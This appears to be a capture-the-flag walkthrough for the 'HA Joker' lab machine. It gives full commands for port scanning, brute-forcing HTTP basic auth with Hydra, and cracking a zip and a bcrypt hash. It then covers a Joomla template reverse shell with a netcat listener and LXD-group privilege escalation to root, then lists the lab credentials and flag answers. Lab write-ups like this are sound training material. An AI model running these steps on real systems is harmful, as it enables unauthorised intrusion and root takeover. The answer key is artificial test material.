# HA Joker CTF - Medium

```shell
rustscan -a 10.10.117.221 --range 0-65535 --ulimit 5000 -- -sV

feroxbuster -u http://10.10.117.221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent
#scanning port 80 webpage

hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.117.221 http-get

feroxbuster -u http://10.10.117.221:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent
#scanning port 8080 webpage

zip2john backup.zip > backuphash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt backuphash.txt

grep -inr "duper"
#gives us the line containing the username and hash
#from joomladb.sql

hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
#crack the hash

nc -nvlp 4444
#setup listener and get reverse shell from Joomla templates

#in reverse shell
id
#we are www-data
#we are in lxd group

python3 -c 'import pty;pty.spawn("/bin/bash")'
#upgrade shell

#referring to lxd privesc article on Google
#in attacker machine
git clone  https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder

./build-alpine
#this builds alpine image, we can transfer this to victim now

python3 -m http.server

#in victim session
cd /tmp

wget http://10.14.31.212:8000/alpine-v3.16-x86_64-20221024_0528.tar.gz
#download the tar archive

#add image to lxd
lxc image import ./alpine-v3.16-x86_64-20221024_0528.tar.gz --alias myimage

lxc image list

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh
#we get root shell

id
#root

cd /mnt/root/root

ls -la
#we get flag
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1
  * 80 - http - Apache httpd 2.4.29 (Ubuntu)
  * 8080 - http - Apache httpd 2.4.29 (Ubuntu)

The webpage on port 80 does not need any authentication, so we can start by enumerating its directories.

On the other hand, port 8080 has basic authentication mechanism, so we will brute-force it later.

We can go through the webpage on port 80; it contains a lot of quote-images related to Joker.

Using Inspect, we can view the source code, but it does not contain any useful info.

Going back to the enumerated directories, we have:

  * /css
  * /img
  * /secret.txt
  * /phpinfo.php

/secret.txt contains a conversation between Batman and Joker
/phpinfo.php contains a lot of info about the backend, we can save it for later.

Now, we can attempt to brute-force the basic auth mechanism on port 8080, with the help of Hydra.

By brute-force, we get the creds joker:hannah; logging into port 8080 leads us to a blog page.

Going through the webpage shows that it is using Joomla CMS; we can use feroxbuster to scan for directories.

Meanwhile, using common-sense, checking /administrator directory leads us to the admin login section.

We are also told to look for a backup file; we find a file - /backup.zip

Now, as the .zip file is encrypted, we can use zip2john and try to crack this.

We get the password as 'hannah', again, using john.

Now we can go through the extracted files and check for any info.

Instead of going through each and every file, we can work smartly - we are told to look for a 'super duper user'; we can use grep to search the word 'duper'.

This gives us a line from db/joomladb.sql file; the super duper user is admin.

We can crack the hash that we found using hashcat; we get the cleartext "abcd1234"

Thus we can log into the administrator section using creds admin:abcd1234, we just need to find out a way to get reverse shell.

Simply Googling for 'Joomla reverse shell' gives us multiple ways to get access; we can use any technique to get reverse shell.

Once we setup and get reverse shell, (by viewing the Template preview), we can go start enumeration of the machine.

Using 'id', we can see that we are part of the lxd group; we can exploit this feature.

Googling for 'lxd privesc' gives us an article which covers this aspect - <https://www.hackingarticles.in/lxd-privilege-escalation/>

Replicating the steps given in the blog, we get root.
```

1. What version of Apache is it? - 2.4.29

2. What port on this machine need not to be authenticated by user and password? - 80

3. There is a file on this port that seems to be secret, what is it? - secret.txt

4. There is another file which reveals information of the backend, what is it? - phpinfo.php

5. What user do you think it is? - joker

6. What port on this machine need to be authenticated by Basic Authentication Mechanism? - 8080

7. What is that password? - hannah

8. What directory looks like as admin directory? - /administrator

9. There is a backup file, what is this file? - backup.zip

10. What is the password? - hannah

11. What is the super duper user? - admin

12. What is the password? - abcd1234

13. What is the owner of this session? - www-data

14. What is this group? - lxd

15. What is the name of the file in the /root directory? - final.txt
